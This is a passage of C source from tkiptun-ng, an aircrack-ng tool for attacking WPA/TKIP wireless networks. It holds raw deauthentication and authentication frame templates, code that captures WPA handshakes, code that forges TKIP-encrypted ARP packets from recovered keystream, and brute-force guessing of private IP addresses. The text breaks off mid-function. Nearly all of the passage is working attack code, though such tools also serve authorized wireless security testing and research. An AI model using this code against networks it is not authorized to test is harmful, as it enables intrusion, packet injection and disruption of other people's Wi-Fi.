/*
 *  802.11 WPA replay & injection attacks
 *
 *  Copyright (C) 2008, 2009 Martin Beck <martin.beck2@gmx.de>
 *
 *  WEP decryption attack (chopchop) developed by KoreK
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *
 *  In addition, as a special exception, the copyright holders give
 *  permission to link the code of portions of this program with the
 *  OpenSSL library under certain conditions as described in each
 *  individual source file, and distribute linked combinations
 *  including the two.
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#if defined(linux)
#include <linux/rtc.h>
#endif

#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/time.h>

#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <dirent.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <time.h>
#include <getopt.h>

#include <fcntl.h>
#include <ctype.h>

#include <limits.h>

#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#include "aircrack-ng/defs.h"
#include "aircrack-ng/version.h"
#include "aircrack-ng/support/pcap_local.h"
#include "aircrack-ng/osdep/osdep.h"
#include "aircrack-ng/support/communications.h"
#include "aircrack-ng/crypto/crypto.h"
#include "aircrack-ng/support/common.h"
#include "aircrack-ng/third-party/eapol.h"
#include "aircrack-ng/tui/console.h"

#define RTC_RESOLUTION 8192

#define REQUESTS 30
#define MAX_APS 20

#define NEW_IV 1
#define RETRY 2
#define ABORT 3

#define DEAUTH_REQ                                                             \
	"\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"

#define AUTH_REQ                                                               \
	"\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00"

#define ASSOC_REQ                                                              \
	"\x00\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xC0\x00\x31\x04\x64\x00"

#define NULL_DATA                                                              \
	"\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B"

#define RTS "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC"

#define RATES "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C"

#define PROBE_REQ                                                              \
	"\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC"         \
	"\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00"

#define RATE_NUM 12

#define RATE_1M 1000000
#define RATE_2M 2000000
#define RATE_5_5M 5500000
#define RATE_11M 11000000

#define RATE_6M 6000000
#define RATE_9M 9000000
#define RATE_12M 12000000
#define RATE_18M 18000000
#define RATE_24M 24000000
#define RATE_36M 36000000
#define RATE_48M 48000000
#define RATE_54M 54000000

#define DEFAULT_MIC_FAILURE_INTERVAL 60

static const char usage[] =

	"\n"
	"  %s - (C) 2008-2022 Thomas d\'Otreppe\n"
	"  https://www.aircrack-ng.org\n"
	"\n"
	"  usage: tkiptun-ng <options> <replay interface>\n"
	"\n"
	"  Filter options:\n"
	"\n"
	"      -d dmac   : MAC address, Destination\n"
	"      -s smac   : MAC address, Source\n"
	"      -m len    : minimum packet length (default: 80) \n"
	"      -n len    : maximum packet length (default: 80)\n"
	"      -t tods   : frame control, To      DS bit\n"
	"      -f fromds : frame control, From    DS bit\n"
	"      -D        : disable AP detection\n"
	"      -Z        : select packets manually\n"
	"\n"
	"  Replay options:\n"
	"\n"
	"      -x nbpps  : number of packets per second\n"
	"      -a bssid  : set Access Point MAC address\n"
	"      -c dmac   : set Destination  MAC address\n"
	"      -h smac   : set Source       MAC address\n"
	"      -e essid  : set target AP SSID\n"
	"      -M sec    : MIC error timeout in seconds [60]\n"
	"\n"
	"  Debug options:\n"
	"\n"
	"      -K prga   : keystream for continuation\n"
	"      -y file   : keystream-file for continuation\n"
	"      -j        : inject FromDS packets\n"
	"      -P pmk    : pmk for verification/vuln testing\n"
	"      -p psk    : psk to calculate pmk with essid\n"
	"\n"
	"  source options:\n"
	"\n"
	"      -i iface  : capture packets from this interface\n"
	"      -r file   : extract packets from this pcap file\n"
	"\n"
	"      --help    : Displays this usage screen\n"
	"\n";

struct communication_options opt;
static struct local_options
{
	unsigned char f_bssid[6];
	unsigned char f_dmac[6];
	unsigned char f_smac[6];
	int f_minlen;
	int f_maxlen;
	int f_minlen_set;
	int f_maxlen_set;
	int f_type;
	int f_subtype;
	int f_tods;
	int f_fromds;
	int f_iswep;

	FILE * f_ivs; /* output ivs file      */

	int r_nbpps;
	int r_fctrl;
	unsigned char r_bssid[6];
	unsigned char r_dmac[6];
	unsigned char r_smac[6];
	unsigned char r_apmac[6];
	unsigned char r_dip[4];
	unsigned char r_sip[4];
	char r_essid[33];
	int r_fromdsinj;
	char r_smac_set;

	char ip_out[16]; // 16 for 15 chars + \x00
	char ip_in[16];
	int port_out;
	int port_in;

	char * iface_out;
	char * s_face;
	char * s_file;
	unsigned char * prga;

	int a_mode;
	int a_count;
	int a_delay;

	int ringbuffer;
	int ghost;
	int prgalen;

	int delay;
	int npackets;

	int fast;
	int bittest;

	int nodetect;

	unsigned char oldkeystream[4096]; /* user-defined old keystream */
	int oldkeystreamlen; /* user-defined old keystream length */
	char wpa_essid[256]; /* essid used for calculating the pmk out of the psk */
	char psk[128]; /* shared passphrase among the clients */
	unsigned char pmk[128]; /* pmk derived from the essid and psk */
	unsigned char
		ptk[80]; /* ptk calculated from all pieces captured in the handshake */
	unsigned char ip_cli[4];
	unsigned char ip_ap[4];
	int got_ptk;
	int got_pmk;
	int got_psk;
	int got_mic_fromds;
	int got_mic_tods;
	int got_ip_ap;
	int got_ip_client;

	struct WPA_hdsk wpa; /* valid WPA handshake data     */
	struct WPA_ST_info wpa_sta; /* used to calculate the pmk */
	time_t wpa_time; /* time when the wpa handshake arrived */

	unsigned char *
		chopped_from_plain; /* chopped plaintext packet from the AP */
	unsigned char * chopped_to_plain; /* chopped plaintext packet to the AP */
	unsigned char * chopped_from_prga; /* chopped keystream from the AP */
	unsigned char * chopped_to_prga; /* chopped keystream to the AP */
	int chopped_from_plain_len;
	int chopped_to_plain_len;
	int chopped_from_prga_len;
	int chopped_to_prga_len;

	struct timeval last_mic_failure; /* timestamp of last mic failure */
	int mic_failure_interval; /* time between allowed mic failures */
} lopt;

// unused, but needed for link
struct devices dev;
extern struct wif *_wi_in, *_wi_out;

struct ARP_req
{
	unsigned char * buf;
	int hdrlen;
	int len;
};

struct APt
{
	unsigned char set;
	unsigned char found;
	unsigned char len;
	unsigned char essid[255];
	unsigned char bssid[6];
	unsigned char chan;
	unsigned int ping[REQUESTS];
	int pwr[REQUESTS];
};

unsigned long nb_pkt_sent;
extern unsigned char h80211[4096];
static unsigned char srcbuf[4096];
static char strbuf[512];
static int alarmed;

static int check_received(unsigned char * packet, unsigned length)
{
	REQUIRE(packet != NULL);

	unsigned z;
	unsigned char bssid[6], smac[6], dmac[6];
	struct ivs2_pkthdr ivs2;

	z = ((packet[1] & 3) != 3) ? 24 : 30;

	if (length < z) return (0);

	/* Check if 802.11e (QoS) */
	if ((packet[0] & 0x80) == 0x80) z += 2;

	switch (packet[1] & 3)
	{
		case 0:
			memcpy(bssid, packet + 16, 6);
			memcpy(dmac, packet + 4, 6);
			memcpy(smac, packet + 10, 6);
			break;
		case 1:
			memcpy(bssid, packet + 4, 6);
			memcpy(dmac, packet + 16, 6);
			memcpy(smac, packet + 10, 6);
			break;
		case 2:
			memcpy(bssid, packet + 10, 6);
			memcpy(dmac, packet + 4, 6);
			memcpy(smac, packet + 16, 6);
			break;
		default:
			memcpy(bssid, packet + 10, 6);
			memcpy(dmac, packet + 16, 6);
			memcpy(smac, packet + 24, 6);
			break;
	}

	if (memcmp(bssid, opt.f_bssid, 6) != 0)
	{
		return (0);
	}
	else
	{
		if (memcmp(dmac, lopt.wpa.stmac, 6) != 0
			&& memcmp(smac, lopt.wpa.stmac, 6) != 0)
			return (0);
	}

	if (z + 26 > length) return (0);

	if (!(packet[1] & 0x40)) // not encrypted
	{
		z += 6; // skip LLC header

		/* check ethertype == EAPOL */
		if (packet[z] == 0x88 && packet[z + 1] == 0x8E
			&& (packet[1] & 0x40) != 0x40)
		{
			if (lopt.wpa.state != 7 || time(NULL) - lopt.wpa_time > 1)
			{
				z += 2; // skip ethertype

				/* frame 1: Pairwise == 1, Install == 0, Ack == 1, MIC == 0 */

				if ((packet[z + 6] & 0x08) != 0 && (packet[z + 6] & 0x40) == 0
					&& (packet[z + 6] & 0x80) != 0
					&& (packet[z + 5] & 0x01) == 0)
				{
					memcpy(lopt.wpa.anonce, &packet[z + 17], 32);
					lopt.wpa.state = 1;
				}

				/* frame 2 or 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1
				 */

				if (z + 17 + 32 > length) return (0);

				if ((packet[z + 6] & 0x08) != 0 && (packet[z + 6] & 0x40) == 0
					&& (packet[z + 6] & 0x80) == 0
					&& (packet[z + 5] & 0x01) != 0)
				{
					if (memcmp(&packet[z + 17], ZERO, 32) != 0)
					{
						memcpy(lopt.wpa.snonce, &packet[z + 17], 32);
						lopt.wpa.state |= 2;
					}

					if ((lopt.wpa.state & 4) != 4)
					{
						lopt.wpa.eapol_size
							= (packet[z + 2] << 8) + packet[z + 3] + 4;

						if (lopt.wpa.eapol_size > sizeof(lopt.wpa.eapol)
							|| length - z < lopt.wpa.eapol_size)
						{
							// ignore packet trying to crash us
							lopt.wpa.eapol_size = 0;
							return (0);
						}

						memcpy(lopt.wpa.keymic, &packet[z + 81], 16);
						memcpy(lopt.wpa.eapol, &packet[z], lopt.wpa.eapol_size);
						memset(lopt.wpa.eapol + 81, 0, 16);
						lopt.wpa.state |= 4;
						lopt.wpa.keyver = packet[z + 6] & 7;
					}
				}

				/* frame 3: Pairwise == 1, Install == 1, Ack == 1, MIC == 1 */

				if ((packet[z + 6] & 0x08) != 0 && (packet[z + 6] & 0x40) != 0
					&& (packet[z + 6] & 0x80) != 0
					&& (packet[z + 5] & 0x01) != 0)
				{
					if (memcmp(&packet[z + 17], ZERO, 32) != 0)
					{
						memcpy(lopt.wpa.anonce, &packet[z + 17], 32);
						lopt.wpa.state |= 1;
					}

					if ((lopt.wpa.state & 4) != 4)
					{
						lopt.wpa.eapol_size
							= (packet[z + 2] << 8) + packet[z + 3] + 4;

						if (lopt.wpa.eapol_size > sizeof(lopt.wpa.eapol)
							|| length - z < lopt.wpa.eapol_size)
						{
							// ignore packet trying to crash us
							lopt.wpa.eapol_size = 0;
							return (0);
						}

						memcpy(lopt.wpa.keymic, &packet[z + 81], 16);
						memcpy(lopt.wpa.eapol, &packet[z], lopt.wpa.eapol_size);
						memset(lopt.wpa.eapol + 81, 0, 16);
						lopt.wpa.state |= 4;
						lopt.wpa.keyver = packet[z + 6] & 7;
					}
				}

				if (lopt.wpa.state == 7)
				{
					memcpy(lopt.wpa.stmac, opt.r_smac, 6);
					PCT;
					printf("WPA handshake: %02X:%02X:%02X:%02X:%02X:%02X "
						   "captured\n",
						   opt.r_bssid[0],
						   opt.r_bssid[1],
						   opt.r_bssid[2],
						   opt.r_bssid[3],
						   opt.r_bssid[4],
						   opt.r_bssid[5]);

					lopt.wpa_time = time(NULL);

					if (lopt.f_ivs != NULL)
					{
						memset(&ivs2, '\x00', sizeof(struct ivs2_pkthdr));
						ivs2.flags = 0;
						ivs2.len = 0;

						ivs2.flags |= IVS2_WPA;

						ivs2.flags |= IVS2_BSSID;
						ivs2.len += 6;

						if (fwrite(&ivs2,
								   1,
								   sizeof(struct ivs2_pkthdr),
								   lopt.f_ivs)
							!= (size_t) sizeof(struct ivs2_pkthdr))
						{
							perror("fwrite(IV header) failed");
							return (1);
						}

						if (fwrite(opt.r_bssid, 1, 6, lopt.f_ivs) != (size_t) 6)
						{
							perror("fwrite(IV bssid) failed");
							return (1);
						}
						ivs2.len -= 6;

						if (fwrite(&(lopt.wpa),
								   1,
								   sizeof(struct WPA_hdsk),
								   lopt.f_ivs)
							!= (size_t) sizeof(struct WPA_hdsk))
						{
							perror("fwrite(IV wpa_hdsk) failed");
							return (1);
						}
					}
				}
			}
		}
	}

	return (0);
}

static void my_read_sleep_cb(void)
{
	int caplen = read_packet(_wi_in, h80211, sizeof(h80211), NULL);
	check_received(h80211, caplen);
}

static int build_arp_request(unsigned char * packet, int * length, int toDS)
{
	REQUIRE(packet != NULL);

	int i;
	unsigned char buf[128];

	packet[0] = 0x88; // QoS Data
	if (toDS)
		packet[1] = 0x41; // encrypted to/fromDS
	else
		packet[1] = 0x42;
	packet[2] = 0x2c;
	packet[3] = 0x00;
	if (toDS)
	{
		memcpy(packet + 4, opt.f_bssid, 6);
		memcpy(packet + 10, opt.r_smac, 6);
		memcpy(packet + 16, lopt.r_apmac, 6);
	}
	else
	{
		memcpy(packet + 4, opt.r_smac, 6);
		memcpy(packet + 10, opt.f_bssid, 6);
		memcpy(packet + 16, lopt.r_apmac, 6);
	}

	packet[22] = 0xD0; // fragment 0
	packet[23] = 0xB4;
	if (toDS)
		packet[24] = 0x01; // priority 1
	else
		packet[24] = 0x02; // priority 2
	packet[25] = 0x00;

	if (toDS)
		set_clear_arp(packet + 26, opt.r_smac, BROADCAST);
	else
		set_clear_arp(packet + 26, lopt.r_apmac, BROADCAST);

	if (toDS)
		memcpy(packet + 26 + 22, lopt.ip_cli, 4);
	else
		memcpy(packet + 26 + 22, lopt.ip_ap, 4);

	memcpy(packet + 26 + 26, BROADCAST, 6);

	if (toDS)
		memcpy(packet + 26 + 32, lopt.ip_ap, 4);
	else
		memcpy(packet + 26 + 32, lopt.ip_cli, 4);

	INVARIANT(*length < (INT_MAX - 26 - 36 - 1));
	*length = 26 + 36;

	calc_tkip_mic(packet, *length, lopt.ptk, packet + (*length));

	INVARIANT(*length < (INT_MAX - 8 - 1));
	*length += 8;

	memcpy(buf, packet + 26, (*length) - 26);
	memcpy(packet + 26 + 8, buf, (*length) - 26); //-V512

	if (toDS)
		memcpy(packet + 26,
			   lopt.chopped_to_prga,
			   8); // set IV&extIV for a toDS frame
	else
		memcpy(packet + 26,
			   lopt.chopped_from_prga,
			   8); // set IV&extIV for a fromDS frame

	INVARIANT(*length < (INT_MAX - 8 - 1));
	(*length) += 8;

	add_icv(packet, *length, 26 + 8);

	(*length) += 4;

	if (toDS)
	{
		if (lopt.chopped_to_prga_len < *length - 26) return (1);

		for (i = 0; i < *length - 26 - 8; i++)
			packet[26 + 8 + i] ^= lopt.chopped_to_prga[8 + i];
	}
	else
	{
		if (lopt.chopped_from_prga_len < *length - 26) return (1);

		INVARIANT(*length < (INT_MAX - 26 - 8 - 1));

		for (i = 0; i < *length - 26 - 8; i++)
			packet[26 + 8 + i] ^= lopt.chopped_from_prga[8 + i];
	}

	return (0);
}

static int check_guess(unsigned char * srcbuf,
					   unsigned char * chopped,
					   int caplen,
					   int clearlen,
					   unsigned char * arp,
					   unsigned char * dmac)
{
	REQUIRE(srcbuf != NULL);
	REQUIRE(chopped != NULL);
	REQUIRE(arp != NULL);

	int i, j, z, pos;

	z = ((srcbuf[1] & 3) != 3) ? 24 : 30;
	if ((srcbuf[0] & 0x80) == 0x80) /* QoS */
		z += 2;

	pos = caplen - z - 8 - clearlen;
	for (i = 0; i < clearlen; i++)
	{
		arp[pos + i] = srcbuf[z + 8 + pos + i] ^ chopped[z + 8 + pos + i];
	}
	for (j = 1; j < 3; j++)
	{
		arp[15] = j;

		memcpy(arp + 26, ZERO, 6); //-V512
		if (check_crc_buf(arp, caplen - z - 8 - 4) == 1)
		{
			for (i = 0; i < pos; i++)
			{
				chopped[z + 8 + i] = srcbuf[z + 8 + i] ^ arp[i];
			}
			return (1);
		}

		memcpy(arp + 26, BROADCAST, 6);
		if (check_crc_buf(arp, caplen - z - 8 - 4) == 1)
		{
			for (i = 0; i < pos; i++)
			{
				chopped[z + 8 + i] = srcbuf[z + 8 + i] ^ arp[i];
			}
			return (1);
		}

		memcpy(arp + 26, dmac, 6);
		if (check_crc_buf(arp, caplen - z - 8 - 4) == 1)
		{
			for (i = 0; i < pos; i++)
			{
				chopped[z + 8 + i] = srcbuf[z + 8 + i] ^ arp[i];
			}
			return (1);
		}
	}

	return (0);
}

static int guess_packet(unsigned char * srcbuf,
						unsigned char * chopped,
						int caplen,
						int clearlen)
{
	REQUIRE(srcbuf != NULL);
	REQUIRE(chopped != NULL);

	int i, j, k, l, z, len;
	unsigned char smac[6], dmac[6], bssid[6];

	unsigned char *ptr, *psip, *pdmac, *pdip;
	unsigned char arp[4096];

	z = ((srcbuf[1] & 3) != 3) ? 24 : 30;
	if ((srcbuf[0] & 0x80) == 0x80) /* QoS */
		z += 2;

	if (caplen - z - 8 - clearlen > 36) // too many unknown bytes
		return (1);

	printf("%i bytes still unknown\n", caplen - z - 8 - clearlen);

	switch (srcbuf[1] & 3)
	{
		case 0:
			memcpy(bssid, srcbuf + 16, 6);
			memcpy(dmac, srcbuf + 4, 6);
			memcpy(smac, srcbuf + 10, 6);
			break;
		case 1:
			memcpy(bssid, srcbuf + 4, 6);
			memcpy(dmac, srcbuf + 16, 6);
			memcpy(smac, srcbuf + 10, 6);
			break;
		case 2:
			memcpy(bssid, srcbuf + 10, 6);
			memcpy(dmac, srcbuf + 4, 6);
			memcpy(smac, srcbuf + 16, 6);
			break;
		default:
			memcpy(bssid, srcbuf + 10, 6);
			memcpy(dmac, srcbuf + 16, 6);
			memcpy(smac, srcbuf + 24, 6);
			break;
	}

	ptr = arp;
	pdmac = arp + 26;
	psip = arp + 22;
	pdip = arp + 32;

	len = sizeof(S_LLC_SNAP_ARP) - 1;
	memcpy(ptr, S_LLC_SNAP_ARP, len);
	ptr += len;

	/* arp hdr */
	len = 6;
	memcpy(ptr, "\x00\x01\x08\x00\x06\x04", len);
	ptr += len;

	/* type of arp */
	len = 2;
	if (memcmp(dmac, "\xff\xff\xff\xff\xff\xff", 6) == 0)
		memcpy(ptr, "\x00\x01", len);
	else
		memcpy(ptr, "\x00\x02", len);
	ptr += len;

	/* src mac */
	len = 6;
	memcpy(ptr, smac, len);
	ptr += len;

	/* dmac */
	if (memcmp(dmac, "\xff\xff\xff\xff\xff\xff", 6) != 0)
	{
		printf("ARP Reply\n");
		memcpy(pdmac, dmac, 6);
	}
	else
	{
		printf("ARP Request\n");
		memcpy(pdmac, ZERO, 6); //-V512
	}

	if (caplen - z - 8 - clearlen == 36)
	{
		printf("Checking 192.168.x.y\n");
		/* check 192.168.i.1-254 */
		for (i = 0; i < 256; i++)
		{
			for (j = 1; j < 255; j++)
			{
				for (k = 1; k < 255; k++)
				{
					psip[0] = 192;
					psip[1] = 168;
					psip[2] = i;
					psip[3] = j;

					pdip[0] = 192;
					pdip[1] = 168;
					pdip[2] = i;
					pdip[3] = k;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}

		printf("Checking 10.0.y.z\n");
		/* check 10.i.j.1-254 */
		for (j = 0; j < 256; j++)
		{
			for (k = 1; k < 255; k++)
			{
				for (l = 1; l < 255; l++)
				{
					psip[0] = 10;
					psip[1] = 0;
					psip[2] = j;
					psip[3] = k;

					pdip[0] = 10;
					pdip[1] = 0;
					pdip[2] = j;
					pdip[3] = l;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}

		printf("Checking 172.16.y.z\n");
		/* check 172.16-31.j.1-254 */
		for (j = 1; j < 255; j++)
		{
			for (k = 1; k < 255; k++)
			{
				for (l = 1; l < 255; l++)
				{
					psip[0] = 172;
					psip[1] = 16;
					psip[2] = j;
					psip[3] = k;

					pdip[0] = 172;
					pdip[1] = 16;
					pdip[2] = j;
					pdip[3] = l;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}
	}

	if (caplen - z - 8 - clearlen == 35)
	{
		printf("Checking 192.168.x.y\n");
		/* check 192.168.i.1-254 */
		for (i = 0; i < 256; i++)
		{
			for (j = 1; j < 255; j++)
			{
				psip[0] = 192;
				psip[1] = 168;
				psip[2] = i;
				psip[3] = j;

				pdip[0] = 192;
				pdip[1] = 168;
				pdip[2] = i;

				if (check_guess(srcbuf,
								chopped,
								caplen,
								clearlen,
								arp,
								dmac)) // got correct guess
					return (0);
			}
		}

		printf("Checking 10.0.y.z\n");
		/* check 10.i.j.1-254 */
		for (i = 0; i < 256; i++)
		{
			for (j = 0; j < 256; j++)
			{
				for (k = 1; k < 255; k++)
				{
					psip[0] = 10;
					psip[1] = i;
					psip[2] = j;
					psip[3] = k;

					pdip[0] = 10;
					pdip[1] = i;
					pdip[2] = j;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}

		printf("Checking 172.16-31.y.z\n");
		/* check 172.16-31.j.1-254 */
		for (i = 16; i < 32; i++)
		{
			for (j = 0; j < 256; j++)
			{
				for (k = 1; k < 255; k++)
				{
					psip[0] = 172;
					psip[1] = i;
					psip[2] = j;
					psip[3] = k;

					pdip[0] = 172;
					pdip[1] = i;
					pdip[2] = j;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}
	}

	if (caplen - z - 8 - clearlen == 34)
	{
		printf("Checking 192.168.x.y\n");
		/* check 192.168.i.1-254 */
		for (i = 0; i < 256; i++)
		{
			for (j = 1; j < 255; j++)
			{
				psip[0] = 192;
				psip[1] = 168;
				psip[2] = i;
				psip[3] = j;

				pdip[0] = 192;
				pdip[1] = 168;

				if (check_guess(srcbuf,
								chopped,
								caplen,
								clearlen,
								arp,
								dmac)) // got correct guess
					return (0);
			}
		}

		printf("Checking 10.x.y.z\n");
		/* check 10.i.j.1-254 */
		for (i = 0; i < 256; i++)
		{
			for (j = 0; j < 256; j++)
			{
				for (k = 1; k < 255; k++)
				{
					psip[0] = 10;
					psip[1] = i;
					psip[2] = j;
					psip[3] = k;

					pdip[0] = 10;
					pdip[1] = i;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}

		printf("Checking 172.16-31.y.z\n");
		/* check 172.16-31.j.1-254 */
		for (i = 16; i < 32; i++)
		{
			for (j = 0; j < 256; j++)
			{
				for (k = 1; k < 255; k++)
				{
					psip[0] = 172;
					psip[1] = i;
					psip[2] = j;
					psip[3] = k;

					pdip[0] = 172;
					pdip[1] = i;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}
	}

	if (caplen - z - 8 - clearlen <= 33 && caplen - z - 8 - clearlen >= 26)
	{
		printf("Checking 192.168.x.y\n");
		/* check 192.168.i.1-254 */
		if ((srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) == 168)
		{
			for (i = 0; i < 256; i++)
			{
				for (j = 1; j < 255; j++)
				{
					psip[0] = 192;
					psip[1] = 168;
					psip[2] = i;
					psip[3] = j;

					pdip[0] = 192;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}

		if ((srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) >= 16
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) < 32)
		{
			printf("Checking 172.16-31.y.z\n");
			/* check 172.16-31.j.1-254 */
			for (i = 16; i < 32; i++)
			{
				for (j = 0; j < 256; j++)
				{
					for (k = 1; k < 255; k++)
					{
						psip[0] = 172;
						psip[1] = i;
						psip[2] = j;
						psip[3] = k;

						pdip[0] = 172;

						if (check_guess(srcbuf,
										chopped,
										caplen,
										clearlen,
										arp,
										dmac)) // got correct guess
							return (0);
					}
				}
			}
		}

		printf("Checking 10.x.y.z\n");
		/* check 10.i.j.1-254 */
		for (i = 0; i < 256; i++)
		{
			for (j = 0; j < 256; j++)
			{
				for (k = 1; k < 255; k++)
				{
					psip[0] = 10;
					psip[1] = i;
					psip[2] = j;
					psip[3] = k;

					pdip[0] = 10;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}
	}

	if (caplen - z - 8 - clearlen == 25)
	{
		printf("Checking 192.168.x.y\n");
		/* check 192.168.i.1-254 */
		if ((srcbuf[z + 8 + 32] ^ chopped[z + 8 + 32]) == 192
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) == 168)
		{
			for (i = 0; i < 256; i++)
			{
				psip[0] = 192;
				psip[1] = 168;
				psip[2] = i;

				if (check_guess(srcbuf,
								chopped,
								caplen,
								clearlen,
								arp,
								dmac)) // got correct guess
					return (0);
			}
		}

		if ((srcbuf[z + 8 + 32] ^ chopped[z + 8 + 32]) == 172
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) >= 16
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) < 32)
		{
			printf("Checking 172.16-31.y.z\n");
			/* check 172.16-31.j.1-254 */
			for (i = 16; i < 32; i++)
			{
				for (j = 0; j < 256; j++)
				{
					psip[0] = 172;
					psip[1] = i;
					psip[2] = j;

					if (check_guess(srcbuf,
									chopped,
									caplen,
									clearlen,
									arp,
									dmac)) // got correct guess
						return (0);
				}
			}
		}

		printf("Checking 10.x.y.z\n");
		/* check 10.i.j.1-254 */
		for (i = 0; i < 256; i++)
		{
			for (j = 0; j < 256; j++)
			{
				psip[0] = 10;
				psip[1] = i;
				psip[2] = j;

				if (check_guess(srcbuf,
								chopped,
								caplen,
								clearlen,
								arp,
								dmac)) // got correct guess
					return (0);
			}
		}
	}

	if (caplen - z - 8 - clearlen == 24)
	{
		printf("Checking 192.168.x.y\n");
		/* check 192.168.i.1-254 */
		if ((srcbuf[z + 8 + 32] ^ chopped[z + 8 + 32]) == 192
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) == 168)
		{
			psip[0] = 192;
			psip[1] = 168;

			if (check_guess(srcbuf,
							chopped,
							caplen,
							clearlen,
							arp,
							dmac)) // got correct guess
				return (0);
		}

		if ((srcbuf[z + 8 + 32] ^ chopped[z + 8 + 32]) == 172
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) >= 16
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) < 32)
		{
			printf("Checking 172.16-31.y.z\n");
			/* check 172.16-31.j.1-254 */
			for (i = 16; i < 32; i++)
			{
				psip[0] = 172;
				psip[1] = i;

				if (check_guess(srcbuf,
								chopped,
								caplen,
								clearlen,
								arp,
								dmac)) // got correct guess
					return (0);
			}
		}

		printf("Checking 10.x.y.z\n");
		/* check 10.i.j.1-254 */
		for (i = 0; i < 256; i++)
		{
			psip[0] = 10;
			psip[1] = i;

			if (check_guess(srcbuf,
							chopped,
							caplen,
							clearlen,
							arp,
							dmac)) // got correct guess
				return (0);
		}
	}

	if (caplen - z - 8 - clearlen <= 23)
	{
		printf("Checking 192.168.x.y\n");
		/* check 192.168.i.1-254 */
		if ((srcbuf[z + 8 + 32] ^ chopped[z + 8 + 32]) == 192
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) == 168)
		{
			psip[0] = 192;

			if (check_guess(srcbuf,
							chopped,
							caplen,
							clearlen,
							arp,
							dmac)) // got correct guess
				return (0);
		}

		if ((srcbuf[z + 8 + 32] ^ chopped[z + 8 + 32]) == 172
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) >= 16
			&& (srcbuf[z + 8 + 33] ^ chopped[z + 8 + 33]) < 32)
		{
			printf("Checking 172.16-31.y.z\n");
			/* check 172.16-31.j.1-254 */
			psip[0] = 172;

			if (check_guess(srcbuf,
							chopped,
							caplen,
							clearlen,
							arp,
							dmac)) // got correct guess
				return (0);
		}

		printf("Checking 10.x.y.z\n");
		/* check 10.i.j.1-254 */
		psip[0] = 10; //-V519

		if (check_guess(srcbuf,
						chopped,
						caplen,
						clearlen,
						arp,
						dmac)) // got correct guess
			return (0);
	}

	if (caplen - z - 8 - clearlen <= 32)
	{
		for (i = 0; i < 256; i++)
		{
			for (j = 1; j < 255; j++)
			{
